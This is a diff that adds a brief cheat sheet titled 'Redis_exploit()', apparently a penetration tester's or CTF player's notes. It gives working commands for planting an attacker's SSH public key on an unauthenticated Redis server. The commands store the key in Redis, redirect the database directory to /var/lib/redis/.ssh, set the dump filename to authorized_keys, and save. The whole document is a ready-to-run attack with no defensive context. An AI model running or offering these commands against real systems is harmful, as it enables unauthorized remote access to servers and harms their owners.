@@ -1,0 +1,19 @@
+  
+Redis_exploit()
+
+  # In local:
+    1. In local (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
+
+  # Query the redis CLI with cat     
+    2. cat key.txt | redis-cli -h <rhost> -x set ssh_key
+
+  # SSH into redis-cli 
+    3. redis-cli -h <rhost>
+
+  # In redis-cli
+    4. GET ssh_key ()
+    5. CONFIG SET dir /var/lib/redis/.ssh
+    6. CONFIG SET dbfilename authorized_keys
+    7. save 
+    8. exit
+
